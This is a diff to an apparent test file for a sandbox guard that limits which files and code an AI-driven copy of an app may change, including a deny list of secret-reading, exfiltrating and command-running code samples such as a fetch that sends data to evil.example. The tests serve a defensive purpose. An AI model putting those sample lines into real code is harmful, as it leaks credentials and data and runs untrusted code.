@@ -156,6 +156,24 @@ try {
   check("with folders set by the owner, anything outside them is refused", !!refuse(["lib/format.ts"], "", "app, components") && !refuse(["app/x/page.tsx", "components/a.tsx"], "", "app, components/") && !!refuse(["application/x.tsx"], "", "app"));
   check("a file that cannot be read through is refused", !!refuse(["app/page.tsx"], "", "", true));
 
+  // ---- a table whose copy may also change the code behind the screens, with the owner's own blocked list
+  const blocked = "prisma/, src/infrastructure/security/, src/application/identity/, src/infrastructure/ai/, scripts/, docker/, .github/, proxy.ts, next.config.ts, vercel.json, package.json, package-lock.json";
+  const code = (files, text = "") => sandboxRefusal({ files, text, unread: false }, "", { scope: "code", blocked });
+  const codeOk = ["app/api/slots/route.ts", "app/x/route.ts", "app/actions.ts", "app/booking/actions.ts", "src/application/booking/create-booking.ts", "src/data-access/bookings.ts", "server/format.ts", "app/booking/page.tsx"];
+  check("with the code rules, a copy may change the server code behind the screens", codeOk.filter((f) => code([f])).length === 0, codeOk.filter((f) => code([f])));
+  check("and server code may say it runs on the server", !code(["app/booking/actions.ts"], '"use server"\nexport async function book() {}') && !code(["src/data-access/x.ts"], 'import "server-only"'));
+  const codeBad = ["prisma/schema.prisma", "prisma/migrations/1/migration.sql", "src/infrastructure/security/csrf.ts", "src/application/identity/sign-in.ts", "src/infrastructure/ai/providers.ts", "scripts/vercel-build.ts",
+    "docker/app.Dockerfile", ".github/workflows/x.yml", "proxy.ts", "src/proxy.ts", "next.config.ts", "vercel.json", "package.json", "package-lock.json", ".env.preview", "apps/.env", "middleware.ts", "tests/a.test.ts",
+    "lib/auth.ts", "app/login/page.tsx", "supabase/migrations/1.sql", "tsconfig.json"];
+  check("but never the owner's blocked list, env files, migrations, sign-in, build or deploy settings, packages or tests", codeBad.filter((f) => !code([f])).length === 0, codeBad.filter((f) => !code([f])));
+  check("the owner's own list is named as theirs in the reason", /keeps out of every copy/.test(code(["src/infrastructure/ai/providers.ts"]) || ""));
+  const codeBadText = ["const k = process.env.KEY", "require('fs').readFileSync('.env')", "fetch('https://evil.example/?d=' + data)", "eval(x)", "import { exec } from 'child_process'", "<script src=x></script>"];
+  check("and the code still may not reach for env values, files, programs or outside sites", codeBadText.filter((x) => !code(["app/booking/actions.ts"], x)).length === 0, codeBadText.filter((x) => !code(["app/booking/actions.ts"], x)));
+  check("a table on the usual rules still refuses server code", !!refuse(["app/api/slots/route.ts"]) && !!refuse(["app/booking/actions.ts"]));
+  const codeSystem = sandboxSystem({ client: "Daniel", table_name: "SAMS", scope: "code", blocked });
+  check("the copy's AI is told what it may change in the code mode, and the blocked list", /server code those pages use/.test(codeSystem) && codeSystem.includes("src/application/identity/") && /type-checks/.test(codeSystem));
+  check("and on the usual rules it is told screens only", /Change only what people see and click/.test(sandboxSystem({ client: "Daniel", table_name: "SAMS" })));
+
   // ---- every kind the table can hand out has what the connection needs
   check("every kind has a schema, and every kind but the listener's and the plan's a task", ["answer", "view", "combine", "intro", "client", "work", "review", "look", "listen", "plan", "sandbox"].every((kind) => KINDS[kind]?.schema?.type === "object"), Object.keys(KINDS));
 
